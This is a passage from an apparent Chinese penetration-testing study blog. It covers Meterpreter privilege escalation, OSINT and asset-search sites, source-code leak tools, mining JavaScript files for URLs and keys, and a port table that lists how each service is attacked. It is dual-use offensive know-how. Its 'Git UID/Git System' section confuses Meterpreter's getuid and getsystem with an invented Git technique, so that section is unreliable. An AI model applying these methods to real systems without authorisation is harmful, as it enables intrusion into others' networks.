212322"></p><p>进入目标主机的终端后可以git uid获者git system手段来提权  或者ps查看系统  进程</p><p>在这个工具下进入目标主机的终端后getuid <em>#命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户身材为  NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。</em> getsystem <em>#自动提权为系统权限</em></p><h3 id="使用详解："><a href="#使用详解：" class="headerlink" title="使用详解："></a>使用详解：</h3><p><a href="https://blog.csdn.net/weixin_45588247/article/details/119614618">https://blog.csdn.net/weixin_45588247/article/details/119614618</a></p><p><strong>MSF还可用来生成Shellcode具体方法现阶段还没里了解[后续可能会更新]可以去上网查查</strong></p><h2 id="Git-UID-和-Git-System-提权"><a href="#Git-UID-和-Git-System-提权" class="headerlink" title="Git UID 和 Git System 提权"></a>Git UID 和 Git System 提权</h2><p>​在后渗透阶段，<strong>git uid</strong> 和 <strong>git system 提权</strong>通常是指攻击者利用Git相关的配置或漏洞进行权限提升，获得更高的系统权限。具体来说：</p><ul><li><strong>Git UID 提权</strong>：Git用户在某些情况下，可能具有某些特权权限，攻击者可以通过利用Git的配置文件、Git钩子或环境变量等方式，获取系统的其他用户UID（用户ID）。攻击者可以尝试将Git配置的UID设置为更高权限的用户，例如root用户，从而提升自己的权限。</li><li><strong>Git System 提权</strong>：在某些情况下，Git的配置文件或Git的执行路径可能被恶意修改。攻击者通过Git操作或某些Git命令（如 <code>git commit</code>、<code>git push</code>）可以借此修改系统配置或在某些环境下通过Git的执行机制，利用Git在系统上执行恶意命令，从而获取更高权限。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>渗透内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息打点</title>
    <link href="/2024/10/02/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9/"/>
    <url>/2024/10/02/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="信息打点"><a href="#信息打点" class="headerlink" title="信息打点"></a>信息打点</h1><h2 id="信息搜集的相关线上工具"><a href="#信息搜集的相关线上工具" class="headerlink" title="信息搜集的相关线上工具"></a>信息搜集的相关线上工具</h2><table><thead><tr><th>标签</th><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>企业信息</td><td>天眼查</td><td><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></td></tr><tr><td>企业信息</td><td>小蓝本</td><td><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></td></tr><tr><td>企业信息</td><td>爱企查</td><td><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td></tr><tr><td>企业信息</td><td>企查查</td><td><a href="https://www.qcc.com/">https://www.qcc.com/</a></td></tr><tr><td>企业信息</td><td>国外企查</td><td><a href="https://opencorporates.com/">https://opencorporates.com/</a></td></tr><tr><td>企业信息</td><td>启信宝</td><td><a href="https://www.qixin.com/">https://www.qixin.com/</a></td></tr><tr><td>备案信息</td><td>备案信息查询</td><td><a href="http://www.beianx.cn/">http://www.beianx.cn/</a></td></tr><tr><td>备案信息</td><td>备案管理系统</td><td><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></td></tr><tr><td>公众号信息</td><td>搜狗微信搜索</td><td><a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a></td></tr><tr><td>注册域名</td><td>域名注册查询</td><td><a href="https://buy.cloud.tencent.com/domain">https://buy.cloud.tencent.com/domain</a></td></tr><tr><td>IP 反查</td><td>IP 反查域名</td><td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td></tr><tr><td>IP 反查</td><td>IP 反查域名</td><td><a href="http://dns.bugscaner.com/">http://dns.bugscaner.com/</a></td></tr><tr><td>DNS 数据</td><td>dnsdumpster</td><td><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></td></tr><tr><td>证书查询</td><td>CertificateSearch</td><td><a href="https://crt.sh/">https://crt.sh/</a></td></tr><tr><td>网络空间</td><td>FOFA</td><td><a href="https://fofa.info/">https://fofa.info/</a></td></tr><tr><td>网络空间</td><td>全球鹰</td><td><a href="http://hunter.qianxin.com/">http://hunter.qianxin.com/</a></td></tr><tr><td>网络空间</td><td>360</td><td><a href="https://quake.360.cn/quake/%23/index">https://quake.360.cn/quake/</a></td></tr><tr><td>威胁情报</td><td>微步在线 情报社区</td><td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td></tr><tr><td>威胁情报</td><td>奇安信 威胁情报中心</td><td><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></td></tr><tr><td>威胁情报</td><td>360 威胁情报中心</td><td><a href="https://ti.360.cn/%23/homepage">https://ti.360.cn/#/homepage</a></td></tr><tr><td>枚举解析</td><td>在线子域名查询</td><td><a href="http://tools.bugscaner.com/subdomain/">http://tools.bugscaner.com/subdomain/</a></td></tr><tr><td>枚举解析</td><td>DNSGrep 子域名查询</td><td><a href="https://www.dnsgrep.cn/subdomain">https://www.dnsgrep.cn/subdomain</a></td></tr><tr><td>枚举解析</td><td>工具强大的子域名收集器</td><td><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></td></tr><tr><td>指纹识别</td><td>在线 cms 指纹识别</td><td><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></td></tr><tr><td>指纹识别</td><td>Wappalyzer</td><td><a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></td></tr><tr><td>指纹识别</td><td>TideFinger 潮汐</td><td><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></td></tr><tr><td>指纹识别</td><td>云悉指纹</td><td><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></td></tr><tr><td>指纹识别</td><td>WhatWeb</td><td><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td></tr><tr><td>指纹识别</td><td>数字观星 Finger-P</td><td><a href="https://fp.shuziguanxing.com/%23/">https://fp.shuziguanxing.com/#/</a></td></tr><tr><td>网络空间</td><td>钟馗之眼</td><td><a href="https://www.zoomeye.org/?R1nG">https://www.zoomeye.org/</a></td></tr><tr><td>网络空间</td><td>零零信安</td><td><a href="https://0.zone/">https://0.zone/</a></td></tr><tr><td>网络空间</td><td>Shodan</td><td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td></tr><tr><td>网络空间</td><td>Censys</td><td><a href="https://censys.io/">https://censys.io/</a></td></tr><tr><td>网络空间</td><td>ONYPHE</td><td><a href="https://www.onyphe.io/">https://www.onyphe.io/</a></td></tr><tr><td>网络空间</td><td>FullHunt</td><td><a href="https://fullhunt.io/">https://fullhunt.io/</a></td></tr><tr><td>网络空间</td><td>Soall Search Engine</td><td><a href="https://soall.org/">https://soall.org/</a></td></tr><tr><td>网络空间</td><td>Netlas</td><td><a href="https://app.netlas.io/responses/">https://app.netlas.io/responses/</a></td></tr><tr><td>网络空间</td><td>Leakix</td><td><a href="https://leakix.net/">https://leakix.net/</a></td></tr><tr><td>网络空间</td><td>DorkSearch</td><td><a href="https://dorksearch.com/">https://dorksearch.com/</a></td></tr><tr><td>威胁情报</td><td>VirusTotal 在线查杀平台</td><td><a href="https://www.virustotal.com/gui/">https://www.virustotal.com/gui/</a></td></tr><tr><td>威胁情报</td><td>VenusEye 威胁情报中心</td><td><a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a></td></tr><tr><td>威胁情报</td><td>绿盟科技 威胁情报云</td><td><a href="https://ti.nsfocus.com/">https://ti.nsfocus.com/</a></td></tr><tr><td>威胁情报</td><td>IBM 情报中心</td><td><a href="https://exchange.xforce.ibmcloud.com/">https://exchange.xforce.ibmcloud.com/</a></td></tr><tr><td>威胁情报</td><td>天际友盟安全智能平台</td><td><a href="https://redqueen.tj-un.com/IntelHome.html">https://redqueen.tj-un.com</a></td></tr><tr><td>威胁情报</td><td>华为安全中心平台</td><td><a href="https://isecurity.huawei.com/sec/web/intelligencePortal.do">https://isecurity.huawei.com/sec</a></td></tr><tr><td>威胁情报</td><td>安恒威胁情报中心</td><td><a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a></td></tr><tr><td>威胁情报</td><td>AlienVault</td><td><a href="https://otx.alienvault.com/">https://otx.alienvault.com/</a></td></tr><tr><td>威胁情报</td><td>深信服</td><td><a href="https://sec.sangfor.com.cn/analysis-platform">https://sec.sangfor.com.cn/</a></td></tr><tr><td>威胁情报</td><td>丁爸情报分析师的工具箱</td><td><a href="http://dingba.top/">http://dingba.top/</a></td></tr><tr><td>威胁情报</td><td>听风者情报源 start.me</td><td><a href="https://start.me/p/X20Apn">https://start.me/p/X20Apn</a></td></tr><tr><td>威胁情报</td><td>GreyNoise Visualizer</td><td><a href="https://viz.greynoise.io/">https://viz.greynoise.io/</a></td></tr><tr><td>威胁情报</td><td>URLhaus 数据库</td><td><a href="https://urlhaus.abuse.ch/browse/">https://urlhaus.abuse.ch/browse/</a></td></tr><tr><td>威胁情报</td><td>Pithus</td><td><a href="https://beta.pithus.org/">https://beta.pithus.org/</a></td></tr></tbody></table><h2 id="业务资产："><a href="#业务资产：" class="headerlink" title="业务资产："></a>业务资产：</h2><p>1、WEB 应用</p><p>2、APP 应用</p><p>3、PC 端应用</p><p>4、小程序应用</p><p>5、微信公众号</p><p>6、其他产品等</p><h2 id="WEB-单域名："><a href="#WEB-单域名：" class="headerlink" title="WEB 单域名："></a>WEB 单域名：</h2><p>可以通过以下方式进行查询</p><p>1、备案信息</p><p>2、企业产权</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408221958707.png" alt="image-20240822195834444"></p><p>3、注册域名</p><p>4、反查解析</p><h2 id="WEB-子域名："><a href="#WEB-子域名：" class="headerlink" title="WEB 子域名："></a>WEB 子域名：</h2><p>1、DNS 数据</p><p>2、证书查询</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408231115983.png" alt="image-20240823111539836"></p><p>3、网络空间</p><p>4、威胁情报</p><p>5、枚举解析</p><h2 id="Web-架构资产：-指纹识别"><a href="#Web-架构资产：-指纹识别" class="headerlink" title="Web 架构资产：(指纹识别)"></a>Web 架构资产：(指纹识别)</h2><p>1、程序语言</p><p>2、框架源码</p><p>3、搭建平台</p><p>4、数据库类</p><p>5、操作系统</p><h3 id="纯内网网站识别cms"><a href="#纯内网网站识别cms" class="headerlink" title="纯内网网站识别cms"></a>纯内网网站识别cms</h3><p>可以使用该工具 [cmseek] </p><p>我觉得如果可以的话也能通过挂内网的代理来查</p><h2 id="源码泄露-开源闭源"><a href="#源码泄露-开源闭源" class="headerlink" title="源码泄露&amp;开源闭源"></a>源码泄露&amp;开源闭源</h2><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><h3 id="后端-开源-指纹识别-源码下载"><a href="#后端-开源-指纹识别-源码下载" class="headerlink" title="后端-开源-指纹识别-源码下载"></a>后端-开源-指纹识别-源码下载</h3><p> [在网上可以直接搜到相关的cms程序源码]</p><h3 id="后端-闭源-配置不当-源码泄漏"><a href="#后端-闭源-配置不当-源码泄漏" class="headerlink" title="后端-闭源-配置不当-源码泄漏"></a>后端-闭源-配置不当-源码泄漏</h3><p>参考文章：<a href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a></p><p>备份：敏感目录文件扫描</p><p>CVS：<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p><p>GIT：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>SVN：<a href="https://github.com/callmefeifei/SvnHack">https://github.com/callmefeifei/SvnHack</a></p><p>DS_Store：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><p>源码泄漏原因：</p><p>1、从源码本身的特性入口</p><p>2、从管理员不好的习惯入口</p><p>3、从管理员不好的配置入口</p><p>4、从管理员不好的意识入口</p><p>5、从管理员资源信息搜集入口</p><p>源码泄漏集合：</p><p>composer.json[便于开发]</p><p>git 源码泄露</p><p>svn 源码泄露</p><p>hg 源码泄漏</p><p>网站备份压缩文件 [通过扫网站的目录有可能扫到网站的压缩文件然后访问下载]</p><p>WEB-INF&#x2F;web.xml 泄露</p><p>DS_Store 文件泄露</p><p>SWP 文件泄露</p><p>CVS 泄露</p><p>Bzr 泄露</p><p>GitHub 源码泄漏</p><h3 id="后端-方向-资源-GITHUB-源码泄漏"><a href="#后端-方向-资源-GITHUB-源码泄漏" class="headerlink" title="后端-方向-资源 GITHUB-源码泄漏"></a>后端-方向-资源 GITHUB-源码泄漏</h3><p>问题 1：识别出大致信息却无下载资源</p><p>问题 2：未识别出信息使用码云资源获取</p><p>[可以直接通过f12看有哪些js文件 如果特征文件（指的是有些文件名可以看出是一些cms框架自带的默认的）可以去github上搜搜看]</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408241759806.png" alt="image-20240824175853583"></p><p>问题 3：其他行业开发使用对口资源站获取</p><p>涉及：</p><p><a href="https://gitee.com/">https://gitee.com/</a></p><p><a href="https://github.com/">https://github.com/</a></p><p><a href="https://www.huzhan.com/">https://www.huzhan.com/</a></p><h2 id="JS架构-框架识别-泄漏提取-API接口枚举-FUZZ爬虫-插件项目"><a href="#JS架构-框架识别-泄漏提取-API接口枚举-FUZZ爬虫-插件项目" class="headerlink" title="JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目"></a>JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目</h2><p>1、JS 前端架构-识别&amp;分析</p><p>2、JS 前端架构-开发框架分析</p><p>3、JS 前端架构-打包器分析</p><p>4、JS 前端架构-提取&amp;FUZZ</p><p>解决：</p><p>1、如何从表现中的 JS 提取价值信息</p><p>2、如何从地址中 FUZZ 提取未知的 JS 文件</p><p>3、如何从 JS 开放框架 WebPack 进行测试</p><h3 id="JS渗透测试"><a href="#JS渗透测试" class="headerlink" title="JS渗透测试"></a>JS渗透测试</h3><p>什么是 JS 渗透测试？</p><p> 在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞JS 开发的 WEB 应用和 PHP，JAVA,NET 等区别在于即没有源代码，也可以通过浏览器的查看源代码获取真实的点。获取 URL，获取 JS 敏感信息，获取代码传参等，所以相当于JS 开发的 WEB 应用属于白盒测试（默认有源码参考），<strong>一般会在 JS 中寻找更多的 URL地址，</strong>在 JS 代码逻辑（加密算法，APIkey 配置，验证逻辑等）进行后期安全测试。</p><p> -后端语言：java php python  .NET框架  在浏览器端看不到真实的源代码；</p><p>-前端语言：JavaScript（JS）和JS框架在浏览器端可以看到真实的源代码</p><p>例子：</p><p>zblog：核心功能采用 PHP 语言去传输接受</p><p>vue.js：核心功能采用框架语法（JS）传输接受</p><h3 id="1、JS-安全问题"><a href="#1、JS-安全问题" class="headerlink" title="1、JS 安全问题"></a>1、JS 安全问题</h3><p> <strong>源码泄漏</strong></p><p> <strong>未授权访问&#x3D;JS 里面分析更多的 URL 访问确定接口路径</strong></p><p> <strong>敏感 key 泄漏&#x3D;JS 文件中可能配置了接口信息（云应用，短信，邮件，数据库等）</strong></p><p> <strong>API 接口安全&#x3D;（代码中加密提交参数传递，更多的 URL 路径）</strong></p><h3 id="2、流行的-Js-框架有那些？"><a href="#2、流行的-Js-框架有那些？" class="headerlink" title="2、流行的 Js 框架有那些？"></a>2、流行的 Js 框架有那些？</h3><p> Vue   NodeJS   jQuery   Angular 等</p><h3 id="3、如何判定-JS-开发应用？"><a href="#3、如何判定-JS-开发应用？" class="headerlink" title="3、如何判定 JS 开发应用？"></a>3、如何判定 JS 开发应用？</h3><p> 插件 wappalyzer</p><p>如图：这并不是JS 开发应用</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408251213026.png" alt="image-20240825121343865"></p><p>这个便是JS 开发应用</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408251222370.png" alt="image-20240825122251186"> </p><p>源程序代码简短</p><p> 引入多个 js 文件</p><p> 一般有&#x2F;static&#x2F;js&#x2F;app.js 等顺序的 js 文件</p><p> 一般 cookie 中有 connect.sid</p><h4 id="（1）查看页面源码"><a href="#（1）查看页面源码" class="headerlink" title="（1）查看页面源码"></a>（1）<strong>查看页面源码</strong></h4><ul><li>右键点击网页，然后选择“查看页面源码”（或类似选项）。在源码中，搜索 <code>&lt;script&gt;</code> 标签。如果你看到大量的 JavaScript 代码或外部 JavaScript 文件链接（通常以 <code>.js</code> 结尾），这表明页面使用了 JavaScript。</li></ul><h4 id="（2）使用浏览器开发者工具"><a href="#（2）使用浏览器开发者工具" class="headerlink" title="（2）使用浏览器开发者工具"></a>（2）<strong>使用浏览器开发者工具</strong></h4><ul><li>按 <code>F12</code> 或右键选择“检查”（或类似选项）打开浏览器的开发者工具。</li><li>在“网络”选项卡中，刷新页面并查看加载的资源。如果你看到很多 <code>.js</code> 文件被加载，说明该网页使用了 JavaScript。</li><li>在“控制台”选项卡中，观察是否有 JavaScript 代码输出的日志、错误或警告信息，这也是页面使用 JavaScript 的迹象。</li></ul><h4 id="（3）查看交互功能"><a href="#（3）查看交互功能" class="headerlink" title="（3）查看交互功能"></a>（3）<strong>查看交互功能</strong></h4><ul><li>观察页面的动态交互功能，比如表单验证、按钮点击后的效果、动态内容加载等。如果这些功能在不刷新页面的情况下发生变化，通常是通过 JavaScript 实现的。</li></ul><h4 id="（4）禁用-JavaScript"><a href="#（4）禁用-JavaScript" class="headerlink" title="（4）禁用 JavaScript"></a>（4）<strong>禁用 JavaScript</strong></h4><ul><li>你可以在浏览器中禁用 JavaScript，然后重新加载页面。大多数浏览器允许你在设置中禁用 JavaScript。如果页面的大部分功能停止工作，或页面显示异常，那么这个页面很可能依赖于 JavaScript。</li></ul><h4 id="（5）识别单页应用（SPA）"><a href="#（5）识别单页应用（SPA）" class="headerlink" title="（5）识别单页应用（SPA）"></a>（5）<strong>识别单页应用（SPA）</strong></h4><ul><li>单页应用（SPA）通常完全依赖 JavaScript。</li><li>点击页面中所包含的其他链接后你可以观察URL的变化（比如URL中包含 <code>#</code> 或路径变化而页面不刷新），这些都表明可能是一个由JavaScript驱动的单页应用。</li></ul><h3 id="4、如何获取更多的-JS-文件？"><a href="#4、如何获取更多的-JS-文件？" class="headerlink" title="4、如何获取更多的 JS 文件？"></a>4、如何获取更多的 JS 文件？</h3><p> 手工-浏览器搜索</p><p> 半自动-Burpsuite 插件</p><p> 工具化-各类提取&amp;FUZZ 项目</p><h3 id="5、如何快速获取价值信息？"><a href="#5、如何快速获取价值信息？" class="headerlink" title="5、如何快速获取价值信息？"></a>5、如何快速获取价值信息？</h3><h4 id="（1）手工搜索分析"><a href="#（1）手工搜索分析" class="headerlink" title="（1）手工搜索分析"></a>（1）手工搜索分析</h4><p>在控制台的网络里边的js文件中shift+ctrl+f依次搜索以下内容</p><p>注意：在搜索到的结果中只需要着重的去看路径即可（因为有的文件路径很长基本不可能爆破出来）</p><p> src&#x3D;</p><p> path&#x3D;   </p><p> method:”get”</p><p> http.get(“</p><p> method:”post”</p><p>$.ajax </p><p><a href="http://service.httppost/">http://service.httppost</a></p><p><a href="http://service.httpget/">http://service.httpget</a></p><h4 id="（2）-半自动-Burpsuite-插件"><a href="#（2）-半自动-Burpsuite-插件" class="headerlink" title="（2） 半自动-Burpsuite 插件"></a>（2） 半自动-Burpsuite 插件</h4><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261741520.png" alt="image-20240826174058378"></p><p>可以去安装这些插件后两个可以去网上搜 在github上都可以搜到</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261742827.png" alt="image-20240826174231776"></p><p>针对HaE这个插件因为正则匹配默认只有一个规则所以需要引进 直接把<a href="https://raw.githubusercontent.com/gh0stkey/HaE/gh-pages/Rules.yml">其中</a>的内容粘贴到上面图片中的路径文件中即可</p><p>注意：在更改yml文件的时候把burp关闭</p><p>出现下图所示的时候表示配置成功</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261742200.png" alt="image-20240826174237153"></p><p>在Proxy-&gt;HTTP history中即可看到被上色的流量包</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261748546.png" alt="屏幕截图 2024-08-26 162129"></p><h4 id="（3）全自动-插件，脚本"><a href="#（3）全自动-插件，脚本" class="headerlink" title="（3）全自动-插件，脚本"></a>（3）全自动-插件，脚本</h4><p>以下项目均可以从github上搜索下载</p><p>1</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261806011.png" alt="image-20240826180622964"></p><p>这个是一个浏览器插件可以发现一些文件路径以及会筛选出一些敏感字符，例如：password、username等</p><p>2</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261808754.png" alt="image-20240826180832720"></p><p>这是一个可以从js文件中获取url的脚本 结果会输出一个html文件可以查看</p><p><strong>注意：有时候会误报</strong></p><p>3</p><p><strong>urlfind脚本[推荐]</strong></p><p>项目地址：<a href="https://github.com/pingc0y/URLFinder/releases/tag/2023.9.9">https://github.com/pingc0y/URLFinder/releases/tag/2023.9.9</a></p><p>可以显示出js文件 以及js文件中的敏感信息还有一些url‘</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261859767.png" alt="image-20240826185926715"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408261859960.png" alt="image-20240826185910884"></p><p>4</p><p><strong>ffuf js文件名爆破 [推荐]</strong></p><p>例如：</p><p><a href="https://github.githubassets.com/assets/vendors-node_modules_dompurify_dist_purify_js-89a69c248502.js">https://github.githubassets.com/assets/vendors-node_modules_dompurify_dist_purify_js-89a69c248502.js</a></p><p>因为有些js文件的url在一个页面中的js文件中可能找不到但是我们可以通过爆破的办法来实现</p><p>项目地址：</p><p><a href="https://github.com/ffuf/ffuf?tab=readme-ov-file">https://github.com/ffuf/ffuf?tab=readme-ov-file</a></p><p>含有很多字典的一个网站：[强烈推荐]</p><p><a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io/</a></p><p>然后我们可以利用jsfinderPlus来获取我们所爆破出来的url中的js文件所包含的url 从而获取更多的信息</p><p>5</p><p>Packer Fuzzer：<a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p><p>本工具支持自动模糊提取对应使用Webpack打包器的站点的API以及API对应的参数内容，并支持对：未授权访问、敏感信息泄露、CORS、SQL注入、水平越权、弱口令、任意文件上传七大漏洞进行模糊高效的快速检测。在扫描结束之后，本工具还支持自动生成扫描报告</p><p>注意识别误报</p><p>可以在fofa或者鹰图等资产搜索平台上搜索使用了Webpack打包器的站点访问目标网站时可以看看wappalyzer插件中的杂项中是否有Webpack</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408262130948.png" alt="image-20240826213044634"></p><h2 id="主机架构-蜜罐识别-WAF识别-端口扫描-协议识别-服务安全"><a href="#主机架构-蜜罐识别-WAF识别-端口扫描-协议识别-服务安全" class="headerlink" title="主机架构&amp;蜜罐识别&amp;WAF识别&amp;端口扫描&amp;协议识别&amp;服务安全"></a>主机架构&amp;蜜罐识别&amp;WAF识别&amp;端口扫描&amp;协议识别&amp;服务安全</h2><p>补充：</p><p>CMS                                                                                                                                                                                                          Discuz、WordPress、Ecshop、蝉知等</p><p>前端技术<br>HTML5、jquery、bootstrap、Vue等</p><p>开发语言<br>PHP、JAVA、Ruby、Python、C#，JS等</p><p>Web服务器<br>Apache、Nginx、IIS、lighttpa等</p><p>应用服务器<br>Tomcat、Jboss、Weblbqic、Websphere等</p><p>操作系统信息<br>Linux、windows等</p><p>应用服务信息:<br>ETP、SSH、RDP、SM、SMTP、LDAP、Rsync等</p><p>CDN信息<br>帝联、cloudflare、网宿、七牛云、阿里云等</p><p>WAF信息<br>创宇盾、宝塔、ModSecurity、玄武盾、OpenRASP等。</p><p>蜜罐信息:<br>HFish、TeaPot、T-Pot、Glastopf等</p><p>Web服务器和应用服务器的区别：web服务器主要是针对前端处理静态的页面内容，应用服务器主要是针对处理动态页面内容 </p><p>web服务器的类型可以直接在浏览器的插件中看到或者响应包中的Server字段中可以看到 </p><p>但是应用服务器就是需要去查看这个网站所开放的端口来判断是什么类型的服务器</p><p>端口扫描：{nmap，Masscan}主动扫描；{网络空间} 被动扫描；</p><p>分清主动扫描和被动扫描  </p><p>nmap推荐可视化操作比较简单直观</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409021024795.png" alt="image-20240902102417660"></p><p>在fofa中的ip聚合中可以看到   [缺点可能有的站点搜不到]</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409020919195.png" alt="image-20240902091946094"></p><h3 id="端口的相关信息"><a href="#端口的相关信息" class="headerlink" title="端口的相关信息"></a>端口的相关信息</h3><table><thead><tr><th>端口</th><th>服务</th><th>渗透用途</th></tr></thead><tbody><tr><td>tcp 20,21</td><td>FTP</td><td>允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</td></tr><tr><td>tcp 22</td><td>SSH</td><td>可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及 内网代理转发,文件传输等等</td></tr><tr><td>tcp 23</td><td>Telnet</td><td>爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令</td></tr><tr><td>tcp 25</td><td>SMTP</td><td>邮件伪造,vrfy&#x2F;expn查询邮件用户信息,可使用smtp-user- enum工具来自动跑</td></tr><tr><td>tcp&#x2F;udp 53</td><td>DNS</td><td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道 的远控</td></tr><tr><td>tcp&#x2F;udp 69</td><td>TFTP</td><td>尝试下载目标及其的各类重要配置文件</td></tr><tr><td>tcp 80- 89,443,8440 -8450,8080- 8089</td><td>各种常用的 Web服务端 口</td><td>可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java 控制 台,各类服务器Web管理面板,各类Web中间件漏洞利用,各 类Web框架漏洞利用等等·····</td></tr><tr><td>tcp 110</td><td>POP3</td><td>可尝试爆破,嗅探</td></tr><tr><td>tcp 111,2049</td><td>NFS</td><td>权限配置不当</td></tr><tr><td>tcp 137,139,445</td><td>Samba</td><td>可尝试爆破以及smb自身的各种远程执行类漏洞利用, 如,ms08-067,ms17-010,嗅探等····</td></tr><tr><td>tcp 143</td><td>IMAP</td><td>可尝试爆破</td></tr><tr><td>udp 161</td><td>SNMP</td><td>爆破默认团队字符串,搜集目标内网信息</td></tr><tr><td>tcp 389</td><td>LDAP</td><td>Idap注入,允许匿名访问,弱口令</td></tr><tr><td>tcp 512,513,514</td><td>Linux rexec</td><td>可爆破,rlogin登陆</td></tr><tr><td>tcp 873</td><td>Rsync</td><td>匿名访问,文件上传</td></tr><tr><td>tcp 1194</td><td>OpenVPN</td><td>想办法钓VPN账号,进内网</td></tr><tr><td>tcp 1352</td><td>Lotus</td><td>弱口令,信息泄漏,爆破</td></tr><tr><td>tcp 1433</td><td>SQL Server</td><td>注入,提权,sa弱口令,爆破</td></tr><tr><td>tcp 1521</td><td>Orade</td><td>tns爆破,注入,弹 shell··</td></tr><tr><td>tcp 1500</td><td>ISPmanager</td><td>弱口令</td></tr><tr><td>tcp 1723</td><td>PPTP</td><td>爆破,想办法钓 VPN账号,进内网</td></tr><tr><td>tcp 2082,2083</td><td>cPanel</td><td>弱口令</td></tr><tr><td>tcp 2181</td><td>ZooKeeper</td><td>未授权访问</td></tr><tr><td>tcp 2601,2604</td><td>Zebra</td><td>默认密码zerbra</td></tr><tr><td>tcp 3128</td><td>Squid</td><td>弱口令</td></tr><tr><td>tcp 3312,3311</td><td>kangle</td><td>弱口令</td></tr><tr><td>tcp 3306</td><td>MySQL</td><td>注入,提权,爆破</td></tr><tr><td>tcp 3389</td><td>Windows rdp</td><td>shift后门[需要03以下的系统],爆破,ms12-020</td></tr><tr><td>tcp 3690</td><td>SVN</td><td>svn泄露,未授权访问</td></tr><tr><td>tcp 4848</td><td>GlassFish</td><td>弱口令</td></tr><tr><td>tcp 5000</td><td>Sybase&#x2F;DB2</td><td>爆破,注入</td></tr><tr><td>tcp 5432</td><td>PostgreSQL</td><td>爆破,注入,弱口令</td></tr><tr><td>tcp 5900,5901,5 902</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td>tcp 5984</td><td>CouchDB</td><td>未授权导致的任意指令执行</td></tr><tr><td>tcp 6379</td><td>Redis</td><td>可尝试未授权访问,弱口令爆破</td></tr><tr><td>tcp 7001,7002</td><td>WebLogic</td><td>Java反序列化,弱口令</td></tr><tr><td>tcp 7778</td><td>Kloxo</td><td>主机面板登录</td></tr><tr><td>tcp 8000</td><td>Ajenti</td><td>弱口令</td></tr><tr><td>tcp 8009</td><td>tomcat Ajp</td><td>Tomcat-Ajp协议漏洞</td></tr><tr><td>tcp 8443</td><td>Plesk</td><td>弱口令</td></tr><tr><td>tcp 8069</td><td>Zabbix</td><td>远程执行,SQL注入</td></tr><tr><td>tcp 8080- 8089</td><td>Jenkins,JBoss</td><td>反序列化,控制台弱口令</td></tr><tr><td>tcp 9080- 9081,9090</td><td>WebSphere</td><td>Java反序列化&#x2F;弱口令</td></tr><tr><td>tcp 9200,9300</td><td>ElasticSearch</td><td>远程执行</td></tr><tr><td>tcp 11211</td><td>Memcached</td><td>未授权访问</td></tr><tr><td>tcp 